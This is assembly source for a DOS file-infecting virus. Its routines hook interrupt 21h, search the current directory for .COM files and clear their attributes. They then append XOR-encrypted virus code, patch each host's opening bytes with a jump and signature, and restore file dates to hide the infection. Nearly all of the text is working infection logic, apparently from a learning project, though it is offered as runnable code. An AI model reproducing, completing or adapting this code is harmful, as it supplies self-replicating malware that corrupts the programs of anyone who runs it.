
;----------------------------------------------------------------------------
; Printf
;----------------------------------------------------------------------------
; Description: Displays a string, and goes to the next line. The string should end with a NULL character 0x00
; Arguments:  ds:si: Address of the string to be displayed
; Registers Destroyed: ax
Printf PROC
push bx
mov ah,0Eh ;teletype output
xor bx, bx ;page 0
DISPLAY_CHAR:
lodsb ;get next character
int 10h ;display
test al, al ;end of string?
jne DISPLAY_CHAR
mov al,0Dh ;display carriage return 
int 10h
mov al,0Ah ;  and line feed
int 10h
pop bx
ret
Printf ENDP
;----------------------------------------------------------------------------
; HookISR
;----------------------------------------------------------------------------
; Description: Installs a new interrupt service routine
; Arguments: AL: Interrupt number , SI: Buffer in which to save old ISR address (DWORD) , DX: Address of new ISR  
; Registers Destroyed: ax, bx, es,bp
HookISR PROC 
GetRelocation bp
cli ; Clear interrupt flag; interrupts disabled when interrupt flag cleared.
mov ah, 35h ; saving old interrupt vector --> Get current interrupt handler for INT 21h . AH=35h - GET INTERRUPT VECTOR and AL=21h for int 21
int 21h ;Get Address of Old ISR  --> Call DOS  (Current interrupt handler returned in ES:BX)
mov word ptr [si], bx ;Save it si+2 = segment and si = offset
mov word ptr [si+2], es 
mov ah, 25h ;Install New ISR --> DOS function 25h SET INTERRUPT VECTOR for interrupt 21h
int 21h
sti ;Set interrupt flag; external, maskable interrupts enabled at the end of the next instruction.
lea si,bp+hookdone
call Printf  
ret
HookISR ENDP
;----------------------------------------------------------------------------
; Printfilename
;----------------------------------------------------------------------------
; Description: print file name with bios after found one
; Arguments: new DTA address Assigned to a variable reserved for him
; Registers Destroyed: bh,cx,si,ah,bp
Printfilename PROC
mov cx,13       ; length of filename
mov si,OFFSET DTA+30    ; DS:SI points to filename in DTA
xor bh,bh       ; video page - 0
mov ah,0Eh      ; function 0Eh - write character

NextChar:

lodsb       ; AL = next character in string
int 10h     ; call BIOS service

loop NextChar
ret
Printfilename ENDP
                          ;

;----------------------------------------------------------------------------
; InfectFile
;----------------------------------------------------------------------------
; Description: Attaches the virus to the file (infect) if not already infected
; Arguments: DTA contains the name of the file to be infected (save in memory)
; Registers Destroyed: dx si ax ds ah bx cx 
InfectFile PROC
GetRelocation bp
lea si,bp+sComFile
call Printf
lea si,bp+sFileattributes
call Printf
Mov Ax,4300h ; Get file attributes and
xor cx,cx
Mov Dx,OFFSET DTA+30 ; Filename from DTA
Int 21h                             
jnc CLEAR_file_attributes 
ret
CLEAR_file_attributes :
lea si,bp+sclearfileAttributes
call Printf
Mov Ax,4301h ; clear file attributes
Xor Cx,Cx ; ALL BE 0
Mov Dx,OFFSET DTA+30 ; Filename from DTA 
Int 21h
jnc OPEN_FILE
ret
OPEN_FILE:   
lea si,bp+sFileOpen
call Printf
;  OPEN FILE 
mov ax, 3D02h ;open file for reading/writing
mov dx,OFFSET DTA+30 ; Filename from DTA
int 21h
jnc FILE_OPENED
ret
FILE_OPENED:
mov word ptr[bp+wHostFileHandle], ax ;save handle
xchg ax,bx   ; Move file handle to BX
STORE_FILE_DATE_TIME:
mov word ptr[bp+wHostAttributes],cx; store them(attributes) on memory --> wHostAttributes
; SAVE date&time
lea si,bp+sDateTime
call Printf
Mov Ax,5700h  ; save file date/time 
mov bx,word ptr[bp+wHostFileHandle] 
xor cx,cx
xor dx,dx     
Int 21h
jnc READ_FIRST_BYTES
jmp CLOSE_FILE
READ_FIRST_BYTES:
mov word ptr[bp+wHostTime],cx ;save the file time last change
mov word ptr[bp+wHostDate],dx ;save the file date last change
; READ FIRST 5 BYTES 
lea si, bp+sFileCheck
call Printf
mov ah,3Fh ;read dos function
mov bx, word ptr[bp+wHostFileHandle] ; bx get the handle
mov cx,5 ;read 5 bytes from the file
lea dx,bp+HostBytesOld ;address of buffer in which to read
int 21h
jnc FILE_READ_OK
jmp CLOSE_FILE
FILE_READ_OK:
lea si,bp+sFileSignature
call Printf
;CHECK FILE FOR PRIOR INFECTION 
lea si ,[bp+HostSignature]
lea di,[bp+VirusSignature]
cld
PUSH DS
POP ES
MOV CX,2 ;string length Signature are 2 ..
CMPSB
JB FILE_NOT_INFECTED;str1 are smaller
JA FILE_NOT_INFECTED;str2 are smaller
;jne FILE_NOT_INFECTED
lea si,bp+sAlreadyInfected
call Printf
jmp CLOSE_FILE
FILE_NOT_INFECTED:
; ADD CODE TO HOST FILE 
mov ax, 4202h ;go to end-of-file
mov bx, word ptr[bp+wHostFileHandle]
xor cx, cx
xor dx, dx
int 21h
jnc MOVE_PTR_OK
jmp CLOSE_FILE
MOVE_PTR_OK:
sub ax, 3 ;length of a JMP instruction (E9 xx xx)
mov word ptr[bp+wHostFileLength], ax ;save the length of the file (minus 3)
lea si,bp+sPointerMoved
call PrintF
mov bx, word ptr[bp+wHostFileHandle]
lea dx, bp+START
mov cx, offset END_OF_CODE-offset START; number of bytes to write, a zero value truncates/extends
; the file to the current file position
;-------------------encryption---------------
SaveRegisters
lea si,bp+EnDe
call Printf
RestoreRegisters
call encrypt;encrypt virus file
mov ah,40h ;append virus code(write it !!)
int 21h
call  encrypt;fix up the mess
jc CLOSE_FILE
lea si, bp+sFileInfected
call Printf
; ADD JMP INSTRUCTION TO BEGINNING OF HOST 
mov ax, 4200h ;go to beginning-of-file
mov bx, word ptr[bp+wHostFileHandle]
xor cx, cx
xor dx, dx
int 21h
jc CLOSE_FILE
lea si,bp+sPointerMoved
call Printf
mov ah, 40h ;write the jmp instruction to the file
mov bx, word ptr[bp+wHostFileHandle]
lea dx, bp+HostBytesNew
mov cx, 5 ;3 for the jmp instruction, and 2 for ...
int 21h ;... the virus signature
jc CLOSE_FILE
lea si,bp+sJumpUpdated
call Printf
lea si,bp+srestoreAttributes
call Printf
Mov Ax,4301h ; set the stored file attributes 
mov cx,word ptr[bp+wHostAttributes]
Mov Dx,OFFSET DTA+30 ; Filename from DTA
Int 21h                             
jnc RESTORE_FILE_DATE_TIME
jmp CLOSE_FILE
RESTORE_FILE_DATE_TIME:
lea si,bp+srestoreDateTime
call Printf
Mov Ax,5701h ; set file date/time 
mov bx,word ptr[bp+wHostFileHandle] 
mov cx,word ptr[bp+wHostTime]
mov dx,word ptr[bp+wHostDate]    
Int 21h
CLOSE_FILE: ; CLOSE FILE 
lea si,bp+sClosingFile
call Printf
mov ah,3Eh
mov bx, word ptr[bp+wHostFileHandle]
int 21h
ret
InfectFile ENDP
;----------------------------------------------------------------------------
; NewDosISR
;----------------------------------------------------------------------------
; Description: Replacment ISR for DOS INT 21h--> after hook the ISR This routine will take place
; Arguments: <none>
; Registers Destroyed: <none>
NewDosISR PROC
dwOldExecISR dd ? ;old ISR address is stored here
pushf ; push the flags reg
cli; Clear interrupt flag; interrupts disabled when interrupt flag cleared. 
SaveRegisters
GetRelocation bp 
mov cx,nVirusID
add cx,bp 
cmp ax,cx ;routine to check residency of virus?
jne COUNTERINT
RestoreRegisters
xchg ax, bx  ;tell calling program that we're resident --> exchange data ax and bx
sti;Set interrupt flag; external, maskable interrupts enabled at the end of the next instruction.
iret ;return, since we don't have to call old ISR --> Interrupt Return 
;iret pops CS, the flags register, and the instruction pointer from the stack and resumes the routine that was interrupted.
COUNTERINT:;count the int 8 that bios get
GetRelocation bp 
cmp word ptr[bp+counter],0000h
je FINDFIRSTFILE
dec  word ptr [bp+counter]
RestoreRegisters
push word ptr [cs:dwOldExecISR + 2] ; segment
push word ptr [cs:dwOldExecISR]     ; offset
sti;Set interrupt flag; external, maskable interrupts enabled at the end of the next instruction.
iret
FINDFIRSTFILE:
GetRelocation bp
mov cs:[bp+counter],0004H ; Initializing the counter
cmp  word ptr[bp+firstfile],0h ;is it the first SEARCH file ?
jne FINDNEXTTFILE
;SEARCH FIRST FILE IN CURRENT DIR
add word ptr[bp+firstfile],1b ;for next time its will be not first file SO SAVE 1 IN MEMORY--> next file
lea si,bp+newDTA
call Printf 
lea dx,bp+DTA   ; DS:DX points to DTA 
mov ah,1AH      ; function 1Ah - set DTA
int 21h         ; call DOS service
mov cx,3Fh      ; attribute mask - all files
lea dx,bp+MASKE_COM  ; DS:DX points ASCIZ filename
mov ah,4Eh      ; function 4Eh - find first file
int 21h         ; call DOS service
jc  baybay  ; If none found then return
call Printfilename
call InfectFile
eraseDTA
jmp QUIT
FINDNEXTTFILE :
GetRelocation bp
mov cx,3Fh      ; attribute mask - all files
lea dx,bp+MASKE_COM  ; DS:DX points ASCIZ filename
mov ah,4Fh    ; function 4Eh - find first file
int 21h         ; call DOS service
jc baybay  ; If none found then return
call Printfilename
call InfectFile
eraseDTA
QUIT:
RestoreRegisters
push word ptr [cs:dwOldExecISR + 2] ; segment
push word ptr [cs:dwOldExecISR]     ; offset
sti;Set interrupt flag; external, maskable interrupts enabled at the end of the next instruction.
iret
baybay:
mov ah,4Ch
int 021h ;terminate program (com files) no longer files to infected 
push word ptr [cs:dwOldExecISR + 2] ; segment
push word ptr [cs:dwOldExecISR]     ; offset
sti;Set interrupt flag; external, maskable interrupts enabled at the end of the next instruction.
iret
NewDosISR ENDP

;----------------------------------------------------------------------------
; Encrypt
;----------------------------------------------------------------------------
; Description: Encrypts or decrypt the virus code
; Arguments: <none>
; Registers Destroyed: cx , si ,di ,ax

Encrypt PROC
;ret ;no Encrypt at all 
encrypt_val dw 3200h
     push     cx
     mov      cx,offset  virus_code+184 ;virus_size are 185
     mov      si,offset virus_code     ;start encryption at data
     mov      di,si
     cld

xor_loop:

     lodsw
     xor      ax,encrypt_val         ;3200h is encryption key
     stosw
     dec      cx
     jcxz     stoppa
     jmp      xor_loop

stoppa:
     mov    cx, word ptr[bp+VirusSignature]
     add    cx,3h 
     mov    word ptr[bp+VirusSignature] , cx; random Virus Signature
     pop      cx
     ret

Encrypt ENDP


